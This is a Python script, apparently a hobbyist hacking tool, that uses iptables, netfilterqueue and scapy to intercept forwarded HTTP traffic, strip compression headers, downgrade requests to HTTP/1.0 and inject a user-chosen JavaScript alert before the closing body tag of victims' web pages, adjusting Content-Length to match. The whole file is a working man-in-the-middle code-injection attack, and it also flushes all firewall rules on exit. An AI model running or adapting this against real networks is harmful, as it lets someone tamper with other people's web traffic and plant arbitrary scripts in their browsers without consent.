import netfilterqueue,subprocess,re
from scapy.all import *

def manage_packet(scapy_packet):
    del scapy_packet[IP].chksum
    del scapy_packet[IP].len
    del scapy_packet[TCP].chksum
    return scapy_packet


def process_packet(packet):  
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(Raw):
        if scapy_packet.haslayer(TCP):
            if scapy_packet[TCP].dport == 80:
                scapy_packet[Raw].load = re.sub(b"Accept-Encoding:.*?\\r\\n",b"",scapy_packet[Raw].load)
                scapy_packet[Raw].load = re.sub(b"HTTP/1.1",b"HTTP/1.0",scapy_packet[Raw].load)   
                scapy_packet = manage_packet(scapy_packet)
                packet.set_payload(bytes(scapy_packet))

            elif scapy_packet[TCP].sport ==80:
                if b"</body>" in scapy_packet[Raw].load:
                    print("[+] Alert message displayed")
                    scapy_packet[Raw].load = scapy_packet[Raw].load.replace(b"</body>",alert)
                contentLength = re.search(b'(?:Content-Length:\s)(\d*)',scapy_packet[Raw].load)
                if contentLength and (b"text/html" in scapy_packet[Raw].load):
                    contentLength = contentLength.group(1)
                    new_contentLength = int(contentLength) + len_alert
                    scapy_packet[Raw].load = scapy_packet[Raw].load.replace(contentLength,(str(new_contentLength)).encode())
                scapy_packet = manage_packet(scapy_packet)
                packet.set_payload(bytes(scapy_packet))
                
                
        
    packet.accept()

def start():
    global alert , len_alert
    msg = str(input("Type alert message : "))
    alert = "</body><script>alert('" + msg + "');</script>"
    len_alert = len(alert) - 7
    alert = alert.encode()
    subprocess.call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 1',shell=True)
    #subprocess.call('iptables -I INPUT -j NFQUEUE --queue-num 1',shell=True)
    #subprocess.call('iptables -I OUTPUT -j NFQUEUE --queue-num 1',shell=True)


    print('[+] iptables configured')
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1,process_packet)
    try:
        queue.run()
    except KeyboardInterrupt:
        subprocess.call('iptables --flush',shell=True)
        print('\n[+] iptables flushed.')

